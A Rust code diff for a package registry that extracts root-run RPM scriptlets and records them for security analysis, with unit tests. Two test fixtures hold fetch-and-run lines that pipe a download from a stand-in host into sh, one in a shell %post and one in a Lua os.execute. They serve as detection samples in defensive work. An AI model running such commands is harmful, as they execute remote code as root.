@@ -34,8 +34,13 @@ use crate::api::handlers::metadata_epoch::metadata_epoch;
 use crate::api::handlers::proxy_helpers::{self, RepoInfo};
 use crate::api::middleware::auth::{require_auth_basic_scope, AuthExtension};
 use crate::api::SharedState;
+use crate::formats::rpm::RpmHandler;
 use crate::models::repository::{RepositoryFormat, RepositoryType};
 use crate::services::cache_classifier;
+use crate::services::conda_scripts::{make_inline_script, InstallScript, ScriptKind};
+use crate::services::package_analysis_service::{
+    record_install_scripts, Completeness, UnanalyzedScript,
+};
 use crate::services::rpm_repodata_cache::{RenderedRepodata, RepodataFingerprint};
 use crate::services::signing_service::SigningService;
 
@@ -1647,6 +1652,35 @@ async fn store_rpm(
     proxy_helpers::record_artifact_metadata(&state.db, artifact_id, repo.id, "rpm", &rpm_metadata)
         .await;
 
+    // `%pre`/`%post`/`%preun`/`%postun` run as root on `dnf install` (#4033).
+    // Best-effort: the artifact row is already committed, and a package with
+    // no scriptlets still records a row so "none present" stays
+    // distinguishable from "never looked".
+    let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&content);
+    debug_assert!(
+        scripts
+            .iter()
+            .chain(unanalyzed.iter().map(|u| &u.script))
+            .all(|s| s.kind.runs_as_root()),
+        "rpm scriptlets are root-privileged hooks"
+    );
+    if let Err(e) = record_install_scripts(
+        &state.db,
+        artifact_id,
+        "rpm",
+        scripts,
+        unanalyzed,
+        completeness,
+    )
+    .await
+    {
+        warn!(
+            artifact_id = %artifact_id,
+            error = %e,
+            "rpm scriptlet analysis could not be recorded"
+        );
+    }
+
     // Surface the package on the Packages page (#3659), keyed on the RPM's
     // NEVRA name and `version-release`, with the RPM header's summary where
     // the header parsed.
@@ -2042,6 +2076,129 @@ pub(crate) fn xml_escape(s: &str) -> String {
         .replace('>', "&gt;")
         .replace('"', "&quot;")
         .replace('\'', "&apos;")
+}
+
+// ---------------------------------------------------------------------------
+// Scriptlet analysis (#4033)
+// ---------------------------------------------------------------------------
+
+/// True when `prog` is a POSIX-style shell, i.e. an interpreter the shell
+/// rule set in [`crate::services::conda_scripts`] actually describes.
+///
+/// RPM's `%post -p /usr/bin/python3` and Debian's `#!/usr/bin/perl` are both
+/// legal, and shell rules run over Python or Perl are wrong in both
+/// directions — they miss `os.system(...)` and fire on `print("| sh")`. A
+/// script under any other interpreter is therefore reported as un-analysed
+/// rather than scanned. The check keys on the basename of the first token so
+/// `/bin/sh -e` and `/usr/bin/env bash` both count.
+pub(crate) fn is_shell_interpreter(prog: &str) -> bool {
+    let mut tokens = prog.split_whitespace();
+    let mut program = tokens.next().unwrap_or("");
+    if program.rsplit('/').next() == Some("env") {
+        program = tokens.next().unwrap_or("");
+    }
+    matches!(
+        program.rsplit('/').next().unwrap_or(""),
+        "sh" | "bash" | "dash" | "ash" | "ksh" | "mksh" | "zsh"
+    )
+}
+
+/// Extract the `%pre`/`%post`/`%preun`/`%postun` scriptlets from an RPM.
+///
+/// Reuses [`RpmHandler::parse_rpm_header`] — the same parse that feeds
+/// `primary.xml` — rather than walking the header a second time. The header
+/// carries each scriptlet as a `STRING` tag with a sibling `*PROG` tag naming
+/// its interpreter, so the `location` names the tag it came from
+/// (`rpm:header#POSTIN`), not an invented file path.
+///
+/// Never fails. A file the parser rejects is `NotRead`. So is one where the
+/// parser fell back to the lead alone: `parse_rpm_header` does that silently
+/// when no main header follows the signature, and the tell is an empty
+/// `version` — `RPMTAG_VERSION` is mandatory, so a header that was actually
+/// read never leaves it blank. Without this check a headerless file would
+/// record `Complete` with no scripts, which is the exact defect #4035/#4036
+/// exist to remove.
+///
+/// A scriptlet under a non-shell interpreter (see [`is_shell_interpreter`])
+/// is returned in the second list, un-analysed, with a sentence saying why:
+/// it exists and runs as root, so its body is stored, but shell rules over
+/// Lua would be wrong in both directions. The package stays `Complete` —
+/// every byte was read; declining to judge one script is a fact carried by
+/// that script's own row, and `Partial` is reserved for bytes we could not
+/// read. A scriptlet with an interpreter but no body (`%post -p
+/// /sbin/ldconfig`) still runs that program as root, so it is recorded with
+/// the program as its body under `rpm:header#POSTINPROG`; a bodiless default
+/// shell is a no-op and is not.
+type ExtractedScripts = (Vec<InstallScript>, Vec<UnanalyzedScript>, Completeness);
+
+fn extract_rpm_scriptlets(content: &[u8]) -> ExtractedScripts {
+    let not_read = |reason: String| (Vec::new(), Vec::new(), Completeness::NotRead { reason });
+    let header = match RpmHandler::parse_rpm_header(content) {
+        Ok(header) => header,
+        Err(e) => return not_read(format!("RPM header could not be parsed: {e}")),
+    };
+    if header.version.is_empty() {
+        return not_read("RPM main header not found; only the lead was read".to_string());
+    }
+
+    let slots = [
+        (
+            ScriptKind::RpmPre,
+            "PREIN",
+            &header.pre_install,
+            &header.pre_install_prog,
+        ),
+        (
+            ScriptKind::RpmPost,
+            "POSTIN",
+            &header.post_install,
+            &header.post_install_prog,
+        ),
+        (
+            ScriptKind::RpmPreUn,
+            "PREUN",
+            &header.pre_uninstall,
+            &header.pre_uninstall_prog,
+        ),
+        (
+            ScriptKind::RpmPostUn,
+            "POSTUN",
+            &header.post_uninstall,
+            &header.post_uninstall_prog,
+        ),
+    ];
+    let mut scripts = Vec::new();
+    let mut unanalyzed = Vec::new();
+    for (kind, tag, body, prog) in slots {
+        let prog = prog.as_deref().map(str::trim).unwrap_or("");
+        match body.as_deref() {
+            Some(body) => {
+                let script = make_inline_script(kind, &format!("rpm:header#{tag}"), body);
+                if prog.is_empty() || is_shell_interpreter(prog) {
+                    scripts.push(script);
+                } else {
+                    // The header parser hands the body over already decoded,
+                    // so its length is the closest thing to the on-disk size.
+                    unanalyzed.push(UnanalyzedScript {
+                        original_size_bytes: body.len() as i64,
+                        script,
+                        reason: format!(
+                            "{tag} runs under {prog}, which the shell rules do not cover"
+                        ),
+                    });
+                }
+            }
+            None if !prog.is_empty() && !is_shell_interpreter(prog) => {
+                scripts.push(make_inline_script(
+                    kind,
+                    &format!("rpm:header#{tag}PROG"),
+                    prog,
+                ));
+            }
+            None => {}
+        }
+    }
+    (scripts, unanalyzed, Completeness::Complete)
 }
 
 // ---------------------------------------------------------------------------
@@ -4824,5 +4981,204 @@ mod catalog_registration_tests {
         let row = row.expect("an rpm upload must write a packages row (#3659)");
         assert_eq!(row.version, "1.0-2");
         assert_eq!(row.versions, vec!["1.0-2".to_string()]);
+    }
+}
+
+/// Scriptlet extraction (#4033). The RPM is assembled in-test — lead,
+/// empty signature header, and a main header whose index entries are all
+/// `STRING` tags — so no binary package is checked in.
+#[cfg(test)]
+mod scriptlet_tests {
+    use super::*;
+    use crate::services::conda_scripts::{analyze_script, ScriptSeverity};
+
+    const RPMTAG_NAME: u32 = 1000;
+    const RPMTAG_VERSION: u32 = 1001;
+    const RPMTAG_PREIN: u32 = 1023;
+    const RPMTAG_POSTIN: u32 = 1024;
+    const RPMTAG_PREUN: u32 = 1025;
+    const RPMTAG_POSTUN: u32 = 1026;
+    const RPMTAG_PREINPROG: u32 = 1085;
+    const RPMTAG_POSTINPROG: u32 = 1086;
+    const RPMTAG_PREUNPROG: u32 = 1087;
+    const RPMTAG_POSTUNPROG: u32 = 1088;
+
+    /// Lead + empty signature header; the main header, if any, goes at 112.
+    fn rpm_lead_and_signature() -> Vec<u8> {
+        let mut data = vec![0u8; 112];
+        data[..4].copy_from_slice(&[0xed, 0xab, 0xee, 0xdb]);
+        data[4] = 3;
+        data[10..14].copy_from_slice(b"pkg\0");
+        data[96..99].copy_from_slice(&[0x8e, 0xad, 0xe8]);
+        data[99] = 1;
+        data
+    }
+
+    /// A header section whose entries are all NUL-terminated `STRING` tags.
+    fn header_section(tags: &[(u32, &str)]) -> Vec<u8> {
+        let mut index = Vec::new();
+        let mut store = Vec::new();
+        for (tag, value) in tags {
+            index.extend_from_slice(&tag.to_be_bytes());
+            index.extend_from_slice(&6u32.to_be_bytes()); // RPM_STRING_TYPE
+            index.extend_from_slice(&(store.len() as u32).to_be_bytes());
+            index.extend_from_slice(&1u32.to_be_bytes());
+            store.extend_from_slice(value.as_bytes());
+            store.push(0);
+        }
+        let mut out = vec![0x8e, 0xad, 0xe8, 1, 0, 0, 0, 0];
+        out.extend_from_slice(&(tags.len() as u32).to_be_bytes());
+        out.extend_from_slice(&(store.len() as u32).to_be_bytes());
+        out.extend_from_slice(&index);
+        out.extend_from_slice(&store);
+        out
+    }
+
+    fn rpm_with(tags: &[(u32, &str)]) -> Vec<u8> {
+        let mut data = rpm_lead_and_signature();
+        data.extend_from_slice(&header_section(tags));
+        data
+    }
+
+    const BASE: [(u32, &str); 2] = [(RPMTAG_NAME, "pkg"), (RPMTAG_VERSION, "1.0")];
+
+    #[test]
+    fn hostile_post_scriptlet_is_found_and_flagged() {
+        let mut tags = BASE.to_vec();
+        tags.push((RPMTAG_POSTIN, "curl -s https://evil.example/x.sh | sh\n"));
+        tags.push((RPMTAG_POSTINPROG, "/bin/sh"));
+        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert!(unanalyzed.is_empty());
+        assert_eq!(scripts.len(), 1);
+        let script = &scripts[0];
+        assert_eq!(script.kind, ScriptKind::RpmPost);
+        assert_eq!(script.path, "rpm:header#POSTIN");
+        assert!(script.kind.runs_as_root());
+        assert!(script.body.starts_with("curl -s"));
+
+        let findings = analyze_script(script);
+        assert!(
+            findings.iter().any(|f| f.severity >= ScriptSeverity::High),
+            "curl | sh in a root-run %post must be a high-severity finding: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn package_without_scriptlets_is_complete_and_empty() {
+        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&BASE));
+        assert!(scripts.is_empty());
+        assert!(unanalyzed.is_empty());
+        assert_eq!(completeness, Completeness::Complete);
+    }
+
+    #[test]
+    fn every_scriptlet_tag_is_recognised_and_runs_as_root() {
+        let mut tags = BASE.to_vec();
+        tags.extend([
+            (RPMTAG_PREIN, "echo pre"),
+            (RPMTAG_POSTIN, "echo post"),
+            (RPMTAG_PREUN, "echo preun"),
+            (RPMTAG_POSTUN, "echo postun"),
+            (RPMTAG_PREINPROG, "/bin/sh"),
+            (RPMTAG_PREUNPROG, "/bin/sh"),
+            (RPMTAG_POSTUNPROG, "/bin/sh"),
+        ]);
+        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert!(unanalyzed.is_empty());
+        let seen: Vec<(ScriptKind, &str)> =
+            scripts.iter().map(|s| (s.kind, s.path.as_str())).collect();
+        assert_eq!(
+            seen,
+            vec![
+                (ScriptKind::RpmPre, "rpm:header#PREIN"),
+                (ScriptKind::RpmPost, "rpm:header#POSTIN"),
+                (ScriptKind::RpmPreUn, "rpm:header#PREUN"),
+                (ScriptKind::RpmPostUn, "rpm:header#POSTUN"),
+            ]
+        );
+        assert!(scripts.iter().all(|s| s.kind.runs_as_root()));
+    }
+
+    /// `%post -p /sbin/ldconfig` stores no body, only the interpreter. That
+    /// program still runs as root, so it is recorded; a bodiless default
+    /// shell interpreter is a no-op and is not.
+    #[test]
+    fn interpreter_only_scriptlet_is_recorded_unless_it_is_the_default_shell() {
+        let mut tags = BASE.to_vec();
+        tags.push((RPMTAG_POSTINPROG, "/sbin/ldconfig"));
+        tags.push((RPMTAG_PREUNPROG, "/bin/sh"));
+        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert!(unanalyzed.is_empty());
+        assert_eq!(scripts.len(), 1);
+        assert_eq!(scripts[0].kind, ScriptKind::RpmPost);
+        assert_eq!(scripts[0].path, "rpm:header#POSTINPROG");
+        assert_eq!(scripts[0].body, "/sbin/ldconfig");
+    }
+
+    /// `%post -p <lua>` is legal and not shell. The script is still recorded
+    /// (it runs as root) but is handed back un-analysed with a reason, and
+    /// the package stays `Complete`: every byte was read.
+    #[test]
+    fn non_shell_scriptlet_is_recorded_but_not_scanned() {
+        let mut tags = BASE.to_vec();
+        tags.push((
+            RPMTAG_POSTIN,
+            "os.execute('curl http://evil.example/p | sh')",
+        ));
+        tags.push((RPMTAG_POSTINPROG, "<lua>"));
+        tags.push((RPMTAG_PREUN, "echo bye"));
+        tags.push((RPMTAG_PREUNPROG, "/usr/bin/env bash"));
+        let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&rpm_with(&tags));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert_eq!(scripts.len(), 1, "the bash %preun is still scanned");
+        assert_eq!(scripts[0].kind, ScriptKind::RpmPreUn);
+
+        assert_eq!(unanalyzed.len(), 1);
+        let UnanalyzedScript {
+            script,
+            original_size_bytes,
+            reason,
+        } = &unanalyzed[0];
+        assert_eq!(script.kind, ScriptKind::RpmPost);
+        assert_eq!(script.path, "rpm:header#POSTIN");
+        assert!(script.kind.runs_as_root());
+        assert!(script.body.contains("os.execute"));
+        assert_eq!(*original_size_bytes, script.body.len() as i64);
+        assert_eq!(
+            reason,
+            "POSTIN runs under <lua>, which the shell rules do not cover"
+        );
+    }
+
+    /// The defect this epic exists to remove: an unreadable package must never
+    /// render as clean. Every shape of "could not read the header" is
+    /// `NotRead`, including the parser's silent lead-only fallback.
+    #[test]
+    fn unreadable_rpms_are_not_read_never_complete() {
+        let not_rpm = b"definitely not an rpm".to_vec();
+        let lead_only = rpm_lead_and_signature();
+        let mut truncated_header = rpm_with(&BASE);
+        truncated_header.truncate(truncated_header.len() - 3);
+
+        for (label, body) in [
+            ("not an rpm", not_rpm),
+            ("lead and signature only", lead_only),
+            ("truncated main header", truncated_header),
+        ] {
+            let (scripts, unanalyzed, completeness) = extract_rpm_scriptlets(&body);
+            assert!(scripts.is_empty(), "{label}");
+            assert!(unanalyzed.is_empty(), "{label}");
+            assert!(
+                matches!(completeness, Completeness::NotRead { .. }),
+                "{label}: expected NotRead, got {completeness:?}"
+            );
+        }
     }
 }
